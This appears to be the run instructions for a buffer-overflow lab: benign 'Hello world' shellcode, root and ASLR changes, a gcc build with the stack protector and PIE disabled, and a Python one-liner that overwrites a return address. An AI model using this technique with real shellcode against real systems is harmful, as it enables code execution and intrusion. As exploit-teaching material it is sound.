# How to Run

```
char shellcode[] = "\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x59\xba\x0f\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffHello world!\r\n"

Preparation instructions: sudo su && echo 1 > /proc/sys/kernel/randomize_va_space 

Compile instructions: gcc heap_spray.c -fno-stack-protector -z execstack -m32 -no-pie -g -o heap_spray

Inspect instructions: objdump -d heap_spray

Run instructions: python -c "print 'A' * 64 + '\x76\x84\x04\x08'" | ./heap_spray
```